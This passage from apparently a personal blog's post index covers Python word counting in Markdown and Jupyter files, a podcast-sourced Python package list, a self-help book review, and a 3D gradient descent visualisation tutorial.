In [2]: testSentence = 'How many words have I written in this blog?' print ( testSentence . split ()) ['How', 'many', 'words', 'have', 'I', 'written', 'in', 'this', 'blog?'] In [3]: # Source: https://github.com/gandreadis/markdown-word-count def count_words_in_markdown ( filePath : str ): with open ( filePath , 'r' , encoding = 'utf8' ) as f : text = f . read () # Comments text = re . sub ( r '<!--(.*?)-->' , '' , text , flags = re . MULTILINE ) # Tabs to spaces text = text . replace ( ' \\t ' , ' ' ) # More than 1 space to 4 spaces text = re . sub ( r '[ ]{2,}' , ' ' , text ) # Footnotes text = re . sub ( r '&#94;\\[[&#94;]]*\\][&#94;(].*' , '' , text , flags = re . MULTILINE ) # Indented blocks of code text = re . sub ( r '&#94;( {4,}[&#94;-*]).*' , '' , text , flags = re . MULTILINE ) # Replace newlines with spaces for uniform handling text = text . replace ( ' \\n ' , ' ' ) # Custom header IDs text = re . sub ( r '{#.*}' , '' , text ) # Remove images text = re . sub ( r '!\\[[&#94;\\]]*\\]\\([&#94;)]*\\)' , '' , text ) # Remove HTML tags text = re . sub ( r '</?[&#94;>]*>' , '' , text ) # Remove special characters text = re . sub ( r '[#*`~\\-â€“&#94;=<>+|/:]' , '' , text ) # Remove footnote references text = re . sub ( r '\\[[0-9]*\\]' , '' , text ) # Remove enumerations text = re . sub ( r '[0-9#]*\\.' , '' , text ) return len ( text . split ()) We start by defining the 'top' directory to search within. We call this the 'top' folder as we go 'down' inside more folders inside the 'top' folder. Within pathlib, we can access elements within using glob . A great resource for testing glob patterns, as they are not very intuitive for me personally is https://globster.xyz/ . The glob pattern elements we will use are: ** - Feature known as globstar. Matches all files and zero or more directories and subdirectories. * - Matches any string. ? - Matches single character. .md - Matches files with a .md suffix. For this particular application, the posts are structured within folders which represent the year they are written so we use the 20??/ glob pattern as to exclude other folders. In [4]: # Top directory to search through topFolder : pathlib . Path = pathlib . Path ( 'C:/Users/jackm/Documents/GitHub/jackmckew.dev/content' ) allMarkdown : List = [] # Iterate through all files using pathlib for singleFile in topFolder . glob ( '**/20??/**/*.md' ): allMarkdown . append ( singleFile ) # If you don't want to use glob patterns, can easily use the 'suffix' within the path variable. # for singleFile in topFolder.glob('**/*'): # if singleFile.suffix == '.md': # allMarkdown.append(singleFile) print ( len ( allMarkdown )) 55 We can see that there is 55 markdown files within the folder and all the paths are stored within the list. All we need to do now is loop over all of them, passing the path into a function defined previously to get the total word count. In [5]: totalWordCountMarkdown : int = 0 for singleFile in allMarkdown : totalWordCountMarkdown += count_words_in_markdown ( singleFile ) print ( totalWordCountMarkdown ) 31380 There you have it! 31380 words across all the markdown files. In comparison, my engineering thesis for graduating university was 9916 words across 69 pages. What about Notebooks? This post has been written in a Jupyter notebook , these files (.ipynb) are formatted at the base level as json files. This means that the tool we've just created won't capture any of the Jupyter notebooks within the folder, this will not stand! When working with Jupyter notebooks, everything is broken into 'cells'. Cells can be either be markdown, heading, code or output cells. Markdown cells contain the written explanation or notes around some code Heading cells (denoted by # ) allow for navigatable headings Code cells contain runnable code through a runtime Output cells contain the output from the code cell that precedes it So let's create a function which will count all the markdown cells within a Jupyter notebook's markdown cells. We follow these steps: Read the notebook as a json files Loop through all the cells within the notebook If the cell type matches the type we want, count the words using a similar method Sum all the counts to get the total for the notebook In [6]: from nbformat import current def count_words_in_jupyter ( filePath : str , returnType : str = 'markdown' ): with io . open ( filePath , 'r' , encoding = 'utf-8' ) as f : nb = current . read ( f , 'json' ) word_count_markdown : int = 0 word_count_heading : int = 0 word_count_code : int = 0 for cell in nb . worksheets [ 0 ] . cells : if cell . cell_type == \"markdown\" : word_count_markdown += len ( cell [ 'source' ] . replace ( '#' , '' ) . lstrip () . split ( ' ' )) elif cell . cell_type == \"heading\" : word_count_heading += len ( cell [ 'source' ] . replace ( '#' , '' ) . lstrip () . split ( ' ' )) elif cell . cell_type == \"code\" : word_count_code += len ( cell [ 'input' ] . replace ( '#' , '' ) . lstrip () . split ( ' ' )) if returnType == 'markdown' : return word_count_markdown elif returnType == 'heading' : return word_count_heading elif returnType == 'code' : return word_count_code else : return Exception Now similar to our markdown loop, let's reproduce this looking for & counting words inside Jupyter notebooks. Jupyter creates checkpoint.ipynb files contain a snapshot of the notebook each time it is manually saved, implementing an inbuilt basic version control system. We don't want to count the words in this as it'll be counting the same files over and over again. In [7]: # Top directory to search through topFolder : pathlib . Path = pathlib . Path ( 'C:/Users/jackm/Documents/GitHub/jackmckew.dev/content' ) allJupyter : List = [] # Iterate through all files using pathlib for singleFile in topFolder . glob ( '**/20??/**/*.ipynb' ): if 'checkpoint' not in singleFile . name : allJupyter . append ( singleFile ) print ( len ( allJupyter )) 5 We found 5 notebooks! Now let's loop over them and count all the files in the markdown cells. In [8]: totalWordCountJupyter : int = 0 for singleFile in allJupyter : totalWordCountJupyter += count_words_in_jupyter ( singleFile , 'markdown' ) print ( totalWordCountJupyter ) 3466 There you have it! 3466 words across all the Jupyter notebooks. This brings our total to 34846! In [9]: print ( totalWordCountJupyter + totalWordCountMarkdown ) 34846 Out of interest, let's see how many words live in code within the Jupyter notebooks. In [10]: totalWordCountJupyter : int = 0 for singleFile in allJupyter : totalWordCountJupyter += count_words_in_jupyter ( singleFile , 'code' ) print ( totalWordCountJupyter ) 3292","tags":"Python","url":"https://jackmckew.dev/counting-words-with-python.html","loc":"https://jackmckew.dev/counting-words-with-python.html"},{"title":"Python Bytes Awesome Package List","text":"Python Bytes is a weekly, short & sweet podcast by Michael Kennedy & Brian Okken . After having the podcast recommended numerous times by friends & colleagues, I decided to download every episode thus far on the 14th of September 2019. Over the next 174 days, whenever I was commuting, I'd listen to 171 episodes of Python bytes, learnt a stack of new things and found new amazing python packages. IMPORTANT NOTE : This list has been moved to it's own repository on Github so other listeners can add other awesome packages to this list! Pull requests are 100% open and I'm looking forward to seeing your contributions! https://github.com/JackMcKew/awesome-python-bytes This post is intended to list out the packages I'd noted down & their application. Total disclaimer, I haven't tried out all of these packages personally and I'm certain there is a plethora of other packages mentioned that I have not captured here, please reach out if theres anything to add! I've attempted to sort these into a directory of sorts pending on what you're interested in looking at, and whether I found out about them through Python Bytes or elsewhere (they will have a link to the episode if directly from Python Bytes ). Table Of Contents Web Development Wagtail Wooey Anvil Vue.py GeoDjango Django Bootcamp Security Osmedeus Mongo Audit Data Science Great Expectations PDF Plumber PyJanitor Pandas Vet NB2XLS Data Visualisation Pylustrator Chartify Panel Holoviz Cartoframes Sand Dance Machine Learning PyTorch Yellow Brick Thinc Keras Gym Spinning up Jax Gensim Databases GeoAlchemy Sandman 2 Command Line Interfaces (CLIs) Python Fire Clize Typer Guided User Interfaces (GUIs) Gooey Eel GUI QUICK Great Examples of Tkinter Python Development Attrs PyOxidiser Python Date Utils Pycel Doc Assemble Game Development Panda3D PursuedPyBear Interesting Tidbits Web Development Wagtail https://pythonbytes.fm/episodes/show/70/have-you-seen-my-log-it-s-cute Wagtail is a content management system (CMS) (like Wordpress), written in Python , based off Django . Gallery of sites made with wagtail Wooey https://pythonbytes.fm/episodes/show/62/wooey-and-gooey-are-simple-python-guis A Django app that creates automatic web UIs for Python scripts. Live example at: https://wooey.herokuapp.com/ Anvil https://pythonbytes.fm/episodes/show/106/fluent-query-apis-on-python-collections Full stack web apps with nothing but Python . Vue.py https://pythonbytes.fm/episodes/show/140/becoming-a-10x-developer-sorta use Vue.js with pure Python vue.py provides Python bindings for Vue.js . It uses brython to run Python in the browser. Live example at: https://stefanhoelzl.github.io/vue.py/examples/todo_mvc/ GeoDjango https://docs.djangoproject.com/en/3.0/ref/contrib/gis/ GeoDjango intends to be a world-class geographic Web framework. Its goal is to make it as easy as possible to build GIS Web applications and harness the power of spatially enabled data. Django Bootcamp https://github.com/vitorfs/bootcamp Bootcamp is an open source enterprise social network of open purpose, on which you can build for your own ends. Example at: https://trybootcamp.vitorfs.com/ Security Osmedeus Fully automated offensive security framework for reconnaissance and vulnerability scanning Mongo Audit https://mongoaud.it/ mongoaudit is an automated pentesting tool that lets you know if your MongoDB instances are properly secured Data Science Great Expectations https://pythonbytes.fm/episodes/show/115/dataclass-csv-reader-and-nina-drops-by Great Expectations is a leading tool for validating, documenting, and profiling, your data to maintain quality and improve communication between teams. PDF Plumber https://pythonbytes.fm/episodes/show/26/how-have-you-automated-your-life-or-cli-with-python Plumb a PDF for detailed information about each char, rectangle, line, et cetera â€” and easily extract text and tables. PyJanitor https://pythonbytes.fm/episodes/show/108/spilled-data-call-the-pyjanitor pyjanitor is a project that extends Pandas with a verb-based API, providing convenient data cleaning routines for repetitive tasks. Pandas Vet https://pythonbytes.fm/episodes/show/167/cheating-at-kaggle-and-uwsgi-in-prod pandas-vet is a plugin for flake8 that provides opinionated linting for pandas code. NB2XLS https://github.com/ideonate/nb2xls Convert Jupyter notebooks to Excel Spreadsheets (xlsx), through a new 'Download As' option or via nbconvert on the command line. Data Visualisation Pylustrator https://pythonbytes.fm/episodes/show/137/advanced-python-testing-and-big-time-diffs Pylustrator offers an interactive interface to find the best way to present your data in a figure for publication. Added formatting an styling can be saved by automatically generated code. To compose multiple figures to panels, pylustrator can compose different subfigures to a single figure. Chartify https://pythonbytes.fm/episodes/show/109/cpython-byte-code-explorer Chartify is a Python library that makes it easy for data scientists to create charts. Panel Holoviz Panel provides tools for easily composing widgets, plots, tables, and other viewable objects and controls into control panels, apps, and dashboards. Panel works with visualizations from Bokeh , Matplotlib , HoloViews , and other Python plotting libraries, making them instantly viewable either individually or when combined with interactive widgets that control them. Panel works equally well in Jupyter Notebooks, for creating quick data-exploration tools, or as standalone deployed apps and dashboards, and allows you to easily switch between those contexts as needed. Examples at: https://panel.holoviz.org/ Cartoframes A Python package for integrating CARTO maps, analysis, and data services into data science workflows. Python data analysis workflows often rely on the de facto standards pandas and Jupyter notebooks. Integrating CARTO into this workflow saves data scientists time and energy by not having to export datasets as files or retain multiple copies of the data. Instead, CARTOframes give the ability to communicate reproducible analysis while providing the ability to gain from CARTO's services like hosted, dynamic or static maps and Data Observatory augmentation. Sand Dance https://github.com/microsoft/SandDance Visually explore, understand, and present your data. Machine Learning PyTorch https://pythonbytes.fm/episodes/show/80/dan-bader-drops-by-and-we-found-30-new-python-projects Tensors and Dynamic neural networks in Python with strong GPU acceleration Yellow Brick https://pythonbytes.fm/episodes/show/74/contributing-to-open-source-effectively Yellowbrick extends the Scikit-Learn API to make model selection and hyperparameter tuning easier. Under the hood, it's using Matplotlib . Thinc https://pythonbytes.fm/episodes/show/167/cheating-at-kaggle-and-uwsgi-in-prod A refreshing functional take on deep learning, compatible with your favorite libraries. From the makers of spaCy , Prodigy & FastAPI Keras Gym https://github.com/KristianHolsheimer/keras-gym Plug-n-play reinforcement learning with OpenAI Gym and Keras Spinning up https://spinningup.openai.com/en/latest/ Deep reinforcement learning educational resource Jax https://github.com/google/jax JAX is Autograd and XLA, brought together for high-performance machine learning research. Autograd & XLA are both optimisers, this package makes the applications run quicker Gensim https://radimrehurek.com/gensim/ Gensim is an open-source library for unsupervised topic modeling and natural language processing, using modern statistical machine learning. Databases GeoAlchemy https://pythonbytes.fm/episodes/show/77/you-don-t-have-to-be-a-workaholic-to-win Using SQLAlchemy with Spatial Databases. GeoAlchemy 2 provides extensions to SQLAlchemy for working with spatial databases. GeoAlchemy 2 focuses on PostGIS . PostGIS 1.5 and PostGIS 2 are supported. Sandman 2 https://github.com/jeffknupp/sandman2 Automatically generate a RESTful API service for your legacy database. No code required! Command Line Interfaces (CLIs) Python Fire https://pythonbytes.fm/episodes/show/17/google-s-python-is-on-fire-and-simon-says-you-have-cpu-load-pythonically `Python Fire is a library for automatically generating command line interfaces (CLIs) from absolutely any Python` object. Clize https://pythonbytes.fm/episodes/show/167/cheating-at-kaggle-and-uwsgi-in-prod Clize is an argument parser for Python . You can use Clize as an alternative to argparse if you want an even easier way to create command-line interfaces. Typer https://pythonbytes.fm/episodes/show/164/use-type-hints-to-build-your-next-cli-app Typer , build great CLIs. Easy to code. Based on Python type hints. Guided User Interfaces (GUIs) Gooey https://pythonbytes.fm/episodes/show/62/wooey-and-gooey-are-simple-python-guis I personally love Gooey and have it installed in almost every project lately. Gooey turns (almost) any Python command line program into a full GUI application with one line. I have also done a tutorial blog post on Gooey as well at: https://jackmckew.dev/making-executable-guis-with-python-gooey-pyinstaller.html Eel GUI https://pythonbytes.fm/episodes/show/61/on-being-a-senior-engineer Eel is a little Python library for making simple Electron-like offline HTML/JS GUI apps, with full access to Python capabilities and libraries. QUICK https://pythonbytes.fm/episodes/show/166/misunderstanding-software-clocks-and-time A real quick GUI generator for click . Inspired by Gooey , the GUI generator for classical Python argparse -based command line programs. Great Examples of Tkinter https://pythonbytes.fm/episodes/show/63/we-re-still-on-a-desktop-gui-kick A few great examples of what is possible with Tkinter. - https://github.com/victordomingos/PT-Tracking/ - - https://github.com/victordomingos/RepService/ - - https://github.com/victordomingos/ContarDinheiro.py - Python Development Attrs https://pythonbytes.fm/episodes/show/11/django-2.0-is-dropping-python-2-entirely-pipenv-for-profile-functionality-and-pythonic-home-automation Python Classes Without Boilerplate PyOxidiser https://pythonbytes.fm/episodes/show/114/what-should-be-in-the-python-standard-library PyOxidizer is a utility for producing binaries that embed Python . The over-arching goal of PyOxidizer is to make complex packaging and distribution problems simple so application maintainers can focus on building applications instead of toiling with build systems and packaging tools. Python Date Utils https://pythonbytes.fm/episodes/show/136/a-python-kernel-rather-than-cleaning-the-batteries The dateutil module provides powerful extensions to the standard datetime module, available in Python . Pycel https://pythonbytes.fm/episodes/show/171/chilled-out-python-decorators-with-pep-614 A library for compiling excel spreadsheets to Python code & visualizing them as a graph Doc Assemble docassemble is a free, open-source expert system for guided interviews and document assembly. It provides a web site that conducts interviews with users. Based on the information gathered, the interviews can present users with documents in PDF, RTF, or DOCX format, which users can download or e-mail. Game Development Panda3D https://pythonbytes.fm/episodes/show/116/so-you-want-python-in-a-3d-graphics-engine Panda3D is an open-source, completely free-to-use engine for realtime 3D games, visualizations, simulations, experiments PursuedPyBear PursuedPyBear, also known as ppb, exists to be an educational resource. Most obviously used to teach computer science, it can be a useful tool for any topic that a simulation can be helpful. Interesting Tidbits There was one episode that referenced some amazing examples of GUIs built in Tkinter, unfortunately I have been unable to find it again. My note that I had down was 63 GUIs in Tkinter . EDIT: Thank you Anton Alekseev for helping me find this! Tkinter Examples Using --prompt to name your virtualenv for easy identification later on is something I use widely now. https://pythonbytes.fm/episodes/show/168/race-your-donkey-car-with-python Python Graph Gallery is an amazing resource for examples of already made data visualisations. Type hints for busy programmers is a great resource for understanding what type hints are and why you should use them. https://pythonbytes.fm/episodes/show/160/your-json-shall-be-streamed","tags":"Python","url":"https://jackmckew.dev/python-bytes-awesome-package-list.html","loc":"https://jackmckew.dev/python-bytes-awesome-package-list.html"},{"title":"Book Review: Courage To Be Disliked","text":"The courage to be disliked is a book around the work of a 19th century psychologist who determined that happiness lies within the individual and doesn't depend on the past whatsoever. I really enjoyed reading this book, and would recommend it to anyone at all walks & stages of life. The book is structured as a dialogue between a curious youth and a philosopher that the youth had sought out to answer some questions. This was intentional by the authors to try and answer questions that the reader could come up with while reading, I found this really effective and found myself having a question and then it immediately would come up moments later while reading. What I took out of this book was: Comparing yourself to others is only of detriment to your own mental health and well being There is a dangerous belief in believing your past defines you & your future Competition is mostly fictional and that life isn't a race, everyone walks their own path Other people don't pay as much attention to you as you may possibly believe All problems in the world are from interpersonal relationships Not to take on anyone elses tasks, and not let anyone take on your tasks Don't focus on the past or the future, focus on the here and now Overall, the book is broken into five 'chapters' resembling separate nights in which the youth would visit the philosopher, discuss topics, leave with concepts to contemplate and return on the next night with questions. First Night Focusing on the past helps nobody The key point that I took away from this chapter was most things are generally explained in the world as a cause & effect. The standpoint of the psychologist is that rather than focusing on how something in the past affected an outcome, it's rather in the view point of the current goals. This chapter goes into an example of a recluse youth who wouldn't go out for anything, rather preferring to stay at home, inside. The youth argues that this could be due to his upbringing and things that had happened in the recluse's life, while the philosopher returns with the reasoning behind the recluse's nature is because of a possible current goal that person may have. The philosopher argues that the recluse youth may desire attention and affection from their family, and thus by not going into the outside world, that protects the youths situation from changing. Putting it in the frame of which the reasoning is dependent on the current goal of the person in question. Second Night All problems are interpersonal relationship problems This chapter I personally strongly agreed with. The viewpoint in which all problems derive from one human interaction with another and how this is closely tied with the 'feeling of inferiority' causing dilemmas in the world. I resonate with the explanation of the feeling of inferiority being when one compares themself to another, and feels as though they are not equal and the other is superior in one form or another. All of these feeling of inferiority, while they are common, are subjective. By recognising these feelings as subjective, this puts the power to control how we perceive them in the hands of the individual. Although they can easily turn from inferiority to superiority, which can be as detrimental. Third Night Don't take on other people's tasks, and don't let other people take your tasks This chapter delved into a way of life in which one does not live to satisfy the expectations of others and a viewpoint which denies the desire for recognition for others. These concepts are portrayed through the situation in which a child tries to live up to the parents expectations, specifically the scenario where the child tries to live their life along the lines set by the parents. A common scenario of this is what to do for a living, where to go to school and many more factors. The psychological concept to combat this is by denying to live by the expectations of others and not doing things for the sake of receiving recognition from others later on. By seeking the recognition of others, it is as if trying to satisfy the expectations of everyone which can only lead to disappointment. But if you lead such a selfish life, will that not only cause more interpersonal relationship problems? The psychologist standpoint is this in to 'not behave without regards for others' and this is achieved through the separation of tasks. Separation of tasks This concept is portrayed through a child-parent relationship and the topic of studying. A common scenario for this is a heavy handed approach by forcing the child to study either by incentive or punishment, which inevitably may lead to the child resenting the practice which is perceived as favourable. The solution that is presented is if the parent leaves the task in the child's responsibility, but only seeks to provide assistance, if and when the child seeks it. Which hopefully leads to the child seeing benefit in their own actions and enjoying a beneficial action. Fourth Night Self value, horizontal relationships and individualism Self Value By delving into a typical 'self-centred' viewpoint in which someone is the centre of their own world and the viewpoint in which everyone else is to live up to their expectations (detrimental as mentioned earlier), the philosopher attempts to present the standpoint of living for the benefit of the community. Rather than looking at things with expectations for others, by living as if how your own personal actions can be of benefit for others subsequently can lead to a more fulfilling life. Horizontal Relationships Once the concept of living for the benefit of the community (thus resolving interpersonal relationship problems) is achieved, this is further enhanced by the concept of horizontal relationships, wherein one is not above or below any other. As soon as one puts themself in a 'vertical' relationship, wherein one is believed to be superior/inferior to the other, this is only going to cause further interpersonal relationship problems and the cycle continues. By rather living as if everyone is equal, and lives to the benefit of others, this concentrates a fulfilling lifestyle and is beneficial for everyone involved. Fifth Night Live for the now, not the past or the future When you take in all the points & concepts raised above, this are only enhanced further when you take in the concept that the past & the future should not matter whatsoever on the actions you can change now. Therefore by living for the moment, not letting the past be the cause and effect of who you are, living for the benefit of others and treating everybody equal, I find these great steps to leading a more fulfilling, happy life.","tags":"Book Reviews","url":"https://jackmckew.dev/book-review-courage-to-be-disliked.html","loc":"https://jackmckew.dev/book-review-courage-to-be-disliked.html"},{"title":"3D Gradient Descent in Python","text":"Visualising gradient descent in 3 dimensions Building upon our terrain generator from the blog post: https://jackmckew.dev/3d-terrain-in-python.html , today we will implement a demonstration of how gradient descent behaves in 3 dimensions and produce an interactive visualisation similar to the terrain visualisation. Note that my understanding of gradient descent this does not behave in the similar manner as the gradient descent function used heavily in optimisation problems, although this does make for a demonstration. What is Gradient Descent The premise behind gradient descent is at a point in an a 'function' or array, you can determine the minimum value or maximum value by taking the steepest slope around the point till you get to the minimum/maximum. As optimising functions is one of the main premises behind machine learning, gradient descent is used to reduce computation time & resources. Image Source What can I use this for? At it's core, gradient descent is a optimisation algorithm used to minimise a function. The benefit of gradient shines when searching every single possible combination isn't feasible, so taking an iterative approach to finding the minimum is favourable. In machine learning, we use gradient descent to update the parameters of our model. Parameters refer weights on training data, coefficients in Linear Regression, weights in neural networks and more. How? A way of imagining this is if you are at the top of a hill, and want to get to the bottom in the quickest way possible, if you take a step in each time in the direction of the steepest slope, you should hopefully get to the bottom a quick as possible. What could go wrong? The common pitfalls behind gradient descent is that the algorithm can get 'stuck' within holes, ridges or plateaus meaning the algorithm converges on a local minimum, rather than the global minimum. Another problem being the step size can be difficult to estimate before calculation, in that if you take too small of steps it will take too long to converge. Let's get started! First of all, we need to import all the packages we will need to use, then we will use the numpy array from last time which we generated with Perlin Noise . Next we will find the global maximum and minimum, and plot this all on a 2D contour plot. The maximum (highest point) is show by the red dot, while the minimum (lowest point) is shown by the yellow dot. In [11]: from IPython.core.display import HTML import plotly import plotly.graph_objects as go import noise import numpy as np import matplotlib from mpl_toolkits.mplot3d import axes3d % matplotlib inline In [12]: z = world matplotlib . pyplot . imshow ( z , origin = 'lower' , cmap = 'terrain' ) # Find maximum value index in numpy array indices = np . where ( z == z . max ()) max_z_x_location , max_z_y_location = ( indices [ 1 ][ 0 ], indices [ 0 ][ 0 ]) matplotlib . pyplot . plot ( max_z_x_location , max_z_y_location , 'ro' , markersize = 15 ) # Find minimum value index in numpy array indices = np . where ( z == z . min ()) min_z_x_location , min_z_y_location = ( indices [ 1 ][ 0 ], indices [ 0 ][ 0 ]) matplotlib . pyplot . plot ( min_z_x_location , min_z_y_location , 'yo' , markersize = 15 ) Out[12]: [<matplotlib.lines.Line2D at 0x1d927058b88>] For our implementation in this blog post, rather than computing the gradient at each point (typical implementation), we will evaluate our array by searching through the 'neighbouring' values around a certain index. Luckily, an answer from pv on Stackoverflow had already solved this problem for us. In [13]: # Source: https://stackoverflow.com/questions/10996769/pixel-neighbors-in-2d-array-image-using-python # This code by pv (https://stackoverflow.com/users/108184/pv), is to find all the adjacent values around a specific index import numpy as np from numpy.lib.stride_tricks import as_strided def sliding_window ( arr , window_size ): \"\"\" Construct a sliding window view of the array\"\"\" arr = np . asarray ( arr ) window_size = int ( window_size ) if arr . ndim != 2 : raise ValueError ( \"need 2-D input\" ) if not ( window_size > 0 ): raise ValueError ( \"need a positive window size\" ) shape = ( arr . shape [ 0 ] - window_size + 1 , arr . shape [ 1 ] - window_size + 1 , window_size , window_size ) if shape [ 0 ] <= 0 : shape = ( 1 , shape [ 1 ], arr . shape [ 0 ], shape [ 3 ]) if shape [ 1 ] <= 0 : shape = ( shape [ 0 ], 1 , shape [ 2 ], arr . shape [ 1 ]) strides = ( arr . shape [ 1 ] * arr . itemsize , arr . itemsize , arr . shape [ 1 ] * arr . itemsize , arr . itemsize ) return as_strided ( arr , shape = shape , strides = strides ) def cell_neighbours ( arr , i , j , d ): \"\"\"Return d-th neighbors of cell (i, j)\"\"\" w = sliding_window ( arr , 2 * d + 1 ) ix = np . clip ( i - d , 0 , w . shape [ 0 ] - 1 ) jx = np . clip ( j - d , 0 , w . shape [ 1 ] - 1 ) i0 = max ( 0 , i - d - ix ) j0 = max ( 0 , j - d - jx ) i1 = w . shape [ 2 ] - max ( 0 , d - i + ix ) j1 = w . shape [ 3 ] - max ( 0 , d - j + jx ) return w [ ix , jx ][ i0 : i1 , j0 : j1 ] . ravel () Now we will implement our function which will calculate the gradient descent of an array from a point in the array with nominated maximum number of steps & size of step. This works by: extracting a smaller subset array of all the values around a specified point (in this post we will start a the maximum point), locating the minimum in this array (inferring the greatest slope from the current point), move our current location to the minimum repeat till the point stays the same as previous step We also store of all our previous steps in gradient descent in a list such that we can use this to plot later on. In [14]: from dataclasses import dataclass @dataclass class descent_step : \"\"\"Class for storing each step taken in gradient descent\"\"\" value : float x_index : float y_index : float def gradient_descent_3d ( array , x_start , y_start , steps = 50 , step_size = 1 , plot = False ): # Initial point to start gradient descent at step = descent_step ( array [ y_start ][ x_start ], x_start , y_start ) # Store each step taken in gradient descent in a list step_history = [] step_history . append ( step ) # Plot 2D representation of array with startng point as a red marker if plot : matplotlib . pyplot . imshow ( array , origin = 'lower' , cmap = 'terrain' ) matplotlib . pyplot . plot ( x_start , y_start , 'ro' ) current_x = x_start current_y = y_start # Loop through specified number of steps of gradient descent to take for i in range ( steps ): prev_x = current_x prev_y = current_y # Extract array of neighbouring cells around current step location with size nominated neighbours = cell_neighbours ( array , current_y , current_x , step_size ) # Locate minimum in array (steepest slope from current point) next_step = neighbours . min () indices = np . where ( array == next_step ) # Update current point to now be the next point after stepping current_x , current_y = ( indices [ 1 ][ 0 ], indices [ 0 ][ 0 ]) step = descent_step ( array [ current_y ][ current_x ], current_x , current_y ) step_history . append ( step ) # Plot each step taken as a black line to the current point nominated by a red marker if plot : matplotlib . pyplot . plot ([ prev_x , current_x ],[ prev_y , current_y ], 'k-' ) matplotlib . pyplot . plot ( current_x , current_y , 'ro' ) # If step is to the same location as previously, this infers convergence and end loop if prev_y == current_y and prev_x == current_x : print ( f \"Converged in { i } steps\" ) break return next_step , step_history Next, to ensure that we get to our global minimum in the end, we loop through each step size until we reach a step size large enough to reach the global minimum. Note that this is possibly not feasible in some implementations of gradient descent, but for demonstration purposes we will use it here We then randomise a point for the algorithm to start at and then compute the gradient descent until we have a large enough step size to reach the global minimum (see below for a step size smaller than the required size). In [15]: np . random . seed ( 42 ) global_minimum = z . min () indices = np . where ( z == global_minimum ) print ( f \"Target: { global_minimum } @ { indices } \" ) step_size = 0 found_minimum = 99999 # Random starting point start_x = np . random . randint ( 0 , 50 ) start_y = np . random . randint ( 0 , 50 ) # Increase step size until convergence on global minimum while found_minimum != global_minimum : step_size += 1 found_minimum , steps = gradient_descent_3d ( z , start_x , start_y , step_size = step_size , plot = False ) print ( f \"Optimal step size { step_size } \" ) found_minimum , steps = gradient_descent_3d ( z , start_x , start_y , step_size = step_size , plot = True ) print ( f \"Steps: { steps } \" ) Target: -0.0994970053434372 @ (array([16], dtype=int64), array([0], dtype=int64)) Converged in 9 steps Converged in 5 steps Converged in 7 steps Converged in 6 steps Converged in 4 steps Converged in 4 steps Converged in 3 steps Converged in 3 steps Converged in 3 steps Converged in 5 steps Optimal step size 10 Converged in 5 steps Steps: [descent_step(value=0.10347005724906921, x_index=38, y_index=28), descent_step(value=0.007558110170066357, x_index=28, y_index=38), descent_step(value=-0.03461135923862457, x_index=18, y_index=39), descent_step(value=-0.03682023286819458, x_index=8, y_index=35), descent_step(value=-0.07587684690952301, x_index=0, y_index=26), descent_step(value=-0.0994970053434372, x_index=0, y_index=16), descent_step(value=-0.0994970053434372, x_index=0, y_index=16)] Moving from each point to the next is typically represented as a vector, in our case, this will be in 3D space. In 2D space, you would use a quiver plot to show this, in 3D, you can use a Cone Plot . To calculate the vector between each of our steps, we again turn to Stackoverflow from an answer by teclnol . In [16]: # Source https://stackoverflow.com/questions/51272288/how-to-calculate-the-vector-from-two-points-in-3d-with-python def multiDimenDist ( point1 , point2 ): #find the difference between the two points, its really the same as below deltaVals = [ point2 [ dimension ] - point1 [ dimension ] for dimension in range ( len ( point1 ))] runningSquared = 0 #because the pythagarom theorm works for any dimension we can just use that for coOrd in deltaVals : runningSquared += coOrd ** 2 return runningSquared ** ( 1 / 2 ) def findVec ( point1 , point2 , unitSphere = False ): #setting unitSphere to True will make the vector scaled down to a sphere with a radius one, instead of it's orginal length finalVector = [ 0 for coOrd in point1 ] for dimension , coOrd in enumerate ( point1 ): #finding total differnce for that co-ordinate(x,y,z...) deltaCoOrd = point2 [ dimension ] - coOrd #adding total difference finalVector [ dimension ] = deltaCoOrd if unitSphere : totalDist = multiDimenDist ( point1 , point2 ) unitVector = [] for dimen in finalVector : unitVector . append ( dimen / totalDist ) return unitVector else : return finalVector Finally, we build a function that can generate 3D plots with Plotly , similar to the terrain visualisation with the steps in gradient descent visualised as cones and lines. In [17]: def generate_3d_plot ( step_history ): # Initialise empty lists for markers step_markers_x = [] step_markers_y = [] step_markers_z = [] step_markers_u = [] step_markers_v = [] step_markers_w = [] for index , step in enumerate ( step_history ): step_markers_x . append ( step . x_index ) step_markers_y . append ( step . y_index ) step_markers_z . append ( step . value ) # If we haven't reached the final step, calculate the vector between the current step and the next step if index < len ( steps ) - 1 : vec1 = [ step . x_index , step . y_index , step . value ] vec2 = [ steps [ index + 1 ] . x_index , steps [ index + 1 ] . y_index , steps [ index + 1 ] . value ] result_vector = findVec ( vec1 , vec2 ) step_markers_u . append ( result_vector [ 0 ]) step_markers_v . append ( result_vector [ 1 ]) step_markers_w . append ( result_vector [ 2 ]) else : step_markers_u . append ( 0.1 ) step_markers_v . append ( 0.1 ) step_markers_w . append ( 0.1 ) # Include cones at each marker to show direction of step, scatter3d is to show the red line between points and surface for the terrain fig = go . Figure ( data = [ go . Cone ( x = step_markers_x , y = step_markers_y , z = step_markers_z , u = step_markers_u , v = step_markers_v , w = step_markers_w , sizemode = \"absolute\" , sizeref = 2 , anchor = 'tail' ), go . Scatter3d ( x = step_markers_x , y = step_markers_y , z = step_markers_z , mode = 'lines' , line = dict ( color = 'red' , width = 2 )), go . Surface ( colorscale = terrain , z = world , opacity = 0.5 )]) # Z axis is limited to the extent of the terrain array fig . update_layout ( title = 'Gradient Descent Steps' , scene = dict ( zaxis = dict ( range = [ world . min (), world . max ()],),),) return fig # Generate 3D plot from previous random starting location fig = generate_3d_plot ( steps ) HTML ( plotly . offline . plot ( fig , filename = 'random_starting_point_3d_gradient_descent.html' , include_plotlyjs = 'cdn' )) Out[17]: window.PlotlyConfig = {MathJaxConfig: 'local'}; window.PLOTLYENV=window.PLOTLYENV || {}; if (document.getElementById(\"687163b6-c130-49d4-85d9-d4585bd4aea8\")) { Plotly.newPlot( '687163b6-c130-49d4-85d9-d4585bd4aea8', [{\"anchor\": \"tail\", \"sizemode\": \"absolute\", \"sizeref\": 2, \"type\": \"cone\", \"u\": [-10, -10, -10, -8, 0, 0, 0.1], \"v\": [10, 1, -4, -9, -10, 0, 0.1], \"w\": [-0.09591194707900286, -0.04216946940869093, -0.0022088736295700073, -0.03905661404132843, -0.023620158433914185, 0.0, 0.1], \"x\": [38, 28, 18, 8, 0, 0, 0], \"y\": [28, 38, 39, 35, 26, 16, 16], \"z\": [0.10347005724906921, 0.007558110170066357, -0.03461135923862457, -0.03682023286819458, -0.07587684690952301, -0.0994970053434372, -0.0994970053434372]}, {\"line\": 